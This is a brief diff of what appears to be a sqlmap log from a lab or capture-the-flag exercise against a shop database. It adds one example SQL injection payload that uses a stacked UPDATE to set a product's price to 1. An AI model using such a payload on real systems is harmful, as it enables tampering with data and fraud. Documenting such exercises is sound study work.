@@ -57,4 +57,6 @@ Table: products
 
 [14:57:55] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/scalperslair'
 
+[*] Example payload to change column price: "2070%'; update products set price=1 where name like '%2070%'; #"
+
 [*] ending @ 14:57:55 /2025-03-03/
